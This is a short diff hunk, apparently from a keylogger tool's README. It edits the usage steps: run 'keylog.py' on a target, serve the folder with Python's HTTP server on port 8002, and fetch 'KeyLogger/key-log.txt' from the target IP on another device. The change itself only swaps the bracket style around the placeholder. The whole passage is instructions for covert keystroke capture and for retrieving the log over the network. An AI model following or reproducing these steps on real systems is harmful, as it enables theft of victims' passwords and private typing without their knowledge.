@@ -10,4 +10,4 @@ python3 keylog.py
 python3 -m http.server 8002
 
 # On another device, open web browser, type in: 
-http://<target-ip>:8002/KeyLogger/key-log.txt
+http://[target-ip]:8002/KeyLogger/key-log.txt
